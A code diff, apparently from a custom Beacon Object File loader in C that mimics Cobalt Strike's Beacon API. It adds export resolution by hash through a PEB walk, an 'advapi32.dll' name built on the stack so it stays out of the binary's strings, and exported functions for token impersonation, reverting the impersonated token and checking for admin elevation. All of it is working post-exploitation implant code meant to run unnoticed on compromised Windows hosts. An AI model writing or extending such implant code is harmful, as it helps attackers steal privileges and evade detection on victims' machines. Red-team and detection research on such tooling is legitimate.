@@ -65,6 +65,14 @@ typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
 typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
 typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
 typedef int   __stdcall (*pfn_VirtualFree)(void *addr, uint32_t size, uint32_t freeType);
+typedef void *__stdcall (*pfn_LoadLibraryA)(const char *name);
+typedef uint32_t __stdcall (*pfn_GetCurrentProcess)(void);
+typedef int   __stdcall (*pfn_CloseHandle)(void *h);
+/* advapi32 */
+typedef int   __stdcall (*pfn_ImpersonateLoggedOnUser)(void *token);
+typedef int   __stdcall (*pfn_RevertToSelf)(void);
+typedef int   __stdcall (*pfn_OpenProcessToken)(void *proc, uint32_t access, void **outTok);
+typedef int   __stdcall (*pfn_GetTokenInformation)(void *tok, int infoClass, void *info, uint32_t infoLen, uint32_t *outLen);
 
 /* Note: RtlMoveMemory is intentionally NOT resolved through
  * kernel32. On Windows 7+ kernel32 exports RtlMoveMemory as a
@@ -76,11 +84,21 @@ typedef int   __stdcall (*pfn_VirtualFree)(void *addr, uint32_t size, uint32_t f
  * that DOES follow forwarders; the loader chooses simplicity. */
 
 typedef struct {
-    pfn_ExitThread      ExitThread;
-    pfn_VirtualAlloc    VirtualAlloc;
-    pfn_VirtualProtect  VirtualProtect;
-    pfn_VirtualFree     VirtualFree;
+    pfn_ExitThread         ExitThread;
+    pfn_VirtualAlloc       VirtualAlloc;
+    pfn_VirtualProtect     VirtualProtect;
+    pfn_VirtualFree        VirtualFree;
+    pfn_LoadLibraryA       LoadLibraryA;
+    pfn_GetCurrentProcess  GetCurrentProcess;
+    pfn_CloseHandle        CloseHandle;
 } kernel32_api_t;
+
+typedef struct {
+    pfn_ImpersonateLoggedOnUser ImpersonateLoggedOnUser;
+    pfn_RevertToSelf            RevertToSelf;
+    pfn_OpenProcessToken        OpenProcessToken;
+    pfn_GetTokenInformation     GetTokenInformation;
+} advapi32_api_t;
 
 /* loader_memcpy — byte-wise copy used for COFF section data and
  * Beacon output buffers. Tiny and forwarder-immune. */
@@ -92,6 +110,7 @@ static void loader_memcpy(void *dst, const void *src, uint32_t n)
 }
 
 static kernel32_api_t g_kapi;
+static advapi32_api_t g_aapi;  /* populated lazily on first Token/IsAdmin call */
 
 /* — Hash + PEB walk (kept from the flat-PIC version) ------------- */
 
@@ -99,6 +118,15 @@ static kernel32_api_t g_kapi;
 #define HASH_VIRTUAL_ALLOC        0x91AFCA54u
 #define HASH_VIRTUAL_PROTECT      0x7946C61Bu
 #define HASH_VIRTUAL_FREE         0x030633ACu  /* VirtualFree */
+#define HASH_LOAD_LIBRARY_A       0xEC0E4E8Eu  /* LoadLibraryA */
+#define HASH_GET_CURRENT_PROCESS  0x7B8F17E6u  /* GetCurrentProcess */
+#define HASH_CLOSE_HANDLE         0x0FFD97FBu  /* CloseHandle */
+/* advapi32 exports — resolved lazily; loader doesn't require advapi32
+ * unless the BOF actually imports a Token/IsAdmin symbol. */
+#define HASH_IMPERSONATE_LOGGED_ON_USER  0x6D821B37u
+#define HASH_REVERT_TO_SELF              0x50DEC82Au
+#define HASH_OPEN_PROCESS_TOKEN          0x591EA70Fu
+#define HASH_GET_TOKEN_INFORMATION       0xDBDB6E5Au
 
 static uint32_t ror13_hash(const uint8_t *s)
 {
@@ -153,9 +181,46 @@ static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
 {
     k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
     k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
-    k->VirtualProtect = (pfn_VirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
-    k->VirtualFree    = (pfn_VirtualFree)   resolve_by_hash(k32, HASH_VIRTUAL_FREE);
-    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect && k->VirtualFree;
+    k->VirtualProtect    = (pfn_VirtualProtect)   resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
+    k->VirtualFree       = (pfn_VirtualFree)      resolve_by_hash(k32, HASH_VIRTUAL_FREE);
+    k->LoadLibraryA      = (pfn_LoadLibraryA)     resolve_by_hash(k32, HASH_LOAD_LIBRARY_A);
+    k->GetCurrentProcess = (pfn_GetCurrentProcess)resolve_by_hash(k32, HASH_GET_CURRENT_PROCESS);
+    k->CloseHandle       = (pfn_CloseHandle)      resolve_by_hash(k32, HASH_CLOSE_HANDLE);
+    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect && k->VirtualFree
+        && k->LoadLibraryA && k->GetCurrentProcess && k->CloseHandle;
+}
+
+/* ensure_advapi resolves the advapi32 export set lazily. Returns 1
+ * on success, 0 if any export couldn't be resolved (the caller
+ * surfaces a benign no-op so a BOF that calls Token APIs without
+ * the OS having advapi32 available gets a clean "did nothing"
+ * rather than a crash). */
+static int ensure_advapi(void)
+{
+    if (g_aapi.ImpersonateLoggedOnUser) return 1;  /* already done */
+
+    /* "advapi32.dll" via stack-local char array so the linker
+     * doesn't strand the string in a .rdata slot that needs an
+     * extra reloc the manual loader already handles. */
+    char name[13];
+    name[0]='a'; name[1]='d'; name[2]='v'; name[3]='a'; name[4]='p';
+    name[5]='i'; name[6]='3'; name[7]='2'; name[8]='.'; name[9]='d';
+    name[10]='l'; name[11]='l'; name[12]=0;
+
+    void *a32 = g_kapi.LoadLibraryA(name);
+    if (!a32) return 0;
+
+    g_aapi.ImpersonateLoggedOnUser = (pfn_ImpersonateLoggedOnUser)
+        resolve_by_hash((uint32_t)a32, HASH_IMPERSONATE_LOGGED_ON_USER);
+    g_aapi.RevertToSelf = (pfn_RevertToSelf)
+        resolve_by_hash((uint32_t)a32, HASH_REVERT_TO_SELF);
+    g_aapi.OpenProcessToken = (pfn_OpenProcessToken)
+        resolve_by_hash((uint32_t)a32, HASH_OPEN_PROCESS_TOKEN);
+    g_aapi.GetTokenInformation = (pfn_GetTokenInformation)
+        resolve_by_hash((uint32_t)a32, HASH_GET_TOKEN_INFORMATION);
+
+    return g_aapi.ImpersonateLoggedOnUser && g_aapi.RevertToSelf
+        && g_aapi.OpenProcessToken && g_aapi.GetTokenInformation;
 }
 
 /* — Beacon API surface (step 1.c minimal) ------------------------- */
@@ -190,6 +255,9 @@ static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
 #define HASH_BEACON_ADD_VALUE            0x17030221u
 #define HASH_BEACON_GET_VALUE            0x170702E9u
 #define HASH_BEACON_REMOVE_VALUE         0x07283C8Au
+#define HASH_BEACON_USE_TOKEN            0xB2BEE46Au
+#define HASH_BEACON_REVERT_TOKEN         0xAB981B1Au
+#define HASH_BEACON_IS_ADMIN             0xFC3D55E0u
 
 static uint32_t cstr_len(const char *s)
 {
@@ -557,6 +625,48 @@ __declspec(dllexport) void __cdecl BeaconRemoveValue(const char *key)
     }
 }
 
+/* — Token impersonation + IsAdmin (step 1.f) ---------------------
+ *
+ * Wraps advapi32!ImpersonateLoggedOnUser / RevertToSelf and
+ * advapi32!OpenProcessToken + GetTokenInformation(TokenElevation).
+ * advapi32 is resolved lazily via ensure_advapi(): some host
+ * processes (rundll32 included on certain Windows builds) ship
+ * advapi32 already loaded; if not, kernel32!LoadLibraryA pulls
+ * it in. */
+
+#define TOKEN_QUERY                  0x0008u
+#define TOKEN_INFORMATION_ELEVATION  20  /* TokenElevation enum value */
+
+__declspec(dllexport) int __cdecl BeaconUseToken(void *token)
+{
+    if (!ensure_advapi()) return 0;
+    return g_aapi.ImpersonateLoggedOnUser(token);
+}
+
+__declspec(dllexport) void __cdecl BeaconRevertToken(void)
+{
+    if (!ensure_advapi()) return;
+    g_aapi.RevertToSelf();
+}
+
+__declspec(dllexport) int __cdecl BeaconIsAdmin(void)
+{
+    if (!ensure_advapi()) return 0;
+    void *tok = 0;
+    if (!g_aapi.OpenProcessToken(
+            (void *)(uintptr_t)g_kapi.GetCurrentProcess(),
+            TOKEN_QUERY, &tok)) {
+        return 0;
+    }
+    uint32_t elevation = 0;
+    uint32_t ret_len = 0;
+    int ok = g_aapi.GetTokenInformation(tok, TOKEN_INFORMATION_ELEVATION,
+                                         &elevation, sizeof(elevation), &ret_len);
+    g_kapi.CloseHandle(tok);
+    if (!ok) return 0;
+    return elevation != 0 ? 1 : 0;
+}
+
 static uint32_t beacon_resolve(uint32_t hash)
 {
     /* Output / errors */
@@ -587,6 +697,10 @@ static uint32_t beacon_resolve(uint32_t hash)
     if (hash == HASH_BEACON_ADD_VALUE)            return (uint32_t)&BeaconAddValue;
     if (hash == HASH_BEACON_GET_VALUE)            return (uint32_t)&BeaconGetValue;
     if (hash == HASH_BEACON_REMOVE_VALUE)         return (uint32_t)&BeaconRemoveValue;
+    /* Token + IsAdmin (step 1.f) */
+    if (hash == HASH_BEACON_USE_TOKEN)            return (uint32_t)&BeaconUseToken;
+    if (hash == HASH_BEACON_REVERT_TOKEN)         return (uint32_t)&BeaconRevertToken;
+    if (hash == HASH_BEACON_IS_ADMIN)             return (uint32_t)&BeaconIsAdmin;
     return 0;
 }
 
